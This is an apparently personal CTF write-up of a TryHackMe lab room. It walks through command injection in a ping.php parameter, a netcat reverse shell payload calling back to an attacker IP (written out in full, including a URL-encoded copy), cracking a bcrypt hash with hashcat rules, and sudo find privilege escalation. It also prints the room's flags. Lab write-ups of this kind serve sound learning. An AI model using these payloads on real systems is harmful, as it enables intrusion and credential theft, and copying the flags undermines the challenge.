I recently had an itch to get my hands a bit dirty with some red team exercises, instead of just doing another walkthrough. TryHackMe offers some 'easy' challenges (even though I still often find them quite challenging). I found the room 'Operation Promotion', which basically has no setup: you just spin up the attacker and victim machine and you're offered no additional information.

I partly followed a clean [write-up](https://medium.com/@duvdeven/tryhackmes-operation-promotion-ctf-walkthrough-c5a5521eab17) by Omer David for some guidance.

I followed the instructions that the endpoint gave and tried pinging the lab machine via `http://10.114.177.42/admin/sysmaint-checks/ping.php?host=10.114.177.42`. I knew right away that I somehow want to view the source code of this script `ping.php`, because there'd likely be some vulnerability there. I had to fall back to the write-up from the start to find the trick: one could use a URL-encoded new line `%0A` and then just `cat ping.php`, ie. `http://10.114.177.42/admin/sysmaint-checks/ping.php?host=10.114.177.42%0Acat%20ping.php`. The output is then the executed script plus the code itself:

I tried the `id` command as well, just to see the user on the server: `http://10.114.177.42/admin/sysmaint-checks/ping.php?host=10.114.177.42%0Aid` returns

```console
PING 10.114.177.42 (10.114.177.42) 56(84) bytes of data.

```

Now I could inject a reverse shell payload here! I used [revshells.com](https://www.revshells.com) to generate a suitable payload. It did take some trial and error though, before I found one that worked (the standard `bash -i` did not work, for instance):

```console
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.114.90.35 9001 >/tmp/f
```

I started a listener on my attacker machine using `nc -lvnp 9001` and injected the URL-encoded reverse shell as the payload in the URL:

```
http://10.114.177.42/admin/sysmaint-checks/ping.php?host=0.0.0.0%0rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.114.90.35%209001%20%3E%2Ftmp%2Ff
```

Looking a bit further, I found a hashed password for the user `jford` in `/var/www/html/config`

```console
$ cd /var/www/html/config  
$ ls
    db.conf
$ cat db.conf
    # RecruitCorp application database config
    # Pulled out of source control - DO NOT COMMIT.
    db_host=localhost
    db_name=recruitcorp
    db_user=jford
    db_pass_hash=$2b$10$QzkXmGndA2cQLozO3xAN6eWKrl6ZXyzhYTJNF67exOmTmN5oVSEfq
    db_engine=sqlite3
```

Using our favorite LLM, we find that we're dealing with a *bcrypt* hash. I tried cracking the the hash with some standard wordlist, but to no avail: After ~10 minutes I stopped hashcat because I got impatient.

We can take the string `Spring2026` and write it into a base text-file `base.txt`. Then we can use hashcat to transform this one string into a wordlist containing thousands of permutations/variations of the original string, using the following command:

```console
hashcat --stdout base.txt -r /usr/local/hashcat/rules/dive.rule > custom.txt
```

Using `hashcat -m 3200 hash.txt custom.txt`, where 3200 is the hashcat mode for bcrypt, I actually got a hit after a few minutes:

Using the cracked password, I could then easily SSH into the victim's server as user `jford` and retrieve the flag:

```console
jford@recruitcorp:~$ cat user.txt 
THM{bdbee0a91ebcb0b0fafde931223efe09}
```

The challenge then asks for another flag called `flag.txt`. First, I tried looking for the flag manually:

```console
jford@recruitcorp:~$ sudo find / -type f -name "flag.txt"
/root/flag.txt
jford@recruitcorp:~$ cat /root/flag.txt
cat: /root/flag.txt: Permission denied
```

User `jford` does not have sufficient permissions to read the flag. So I did what I always try in this case and ran `sudo -l` to see whether `jford` may run any binaries with elevated privileges. Indeed, it turned out that I could use the `find` binary:

```console
jford@recruitcorp:~$ sudo -l
Matching Defaults entries for jford on recruitcorp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jford may run the following commands on recruitcorp:
    (root) NOPASSWD: /usr/bin/find
```

So I headed over to GTFOBins and found a suitable attack vector:

```console
jford@recruitcorp:~$ sudo find /root/flag.txt -exec cat {} \;
THM{d999a1f6319a9c5b48c067dfab314ba2}
```
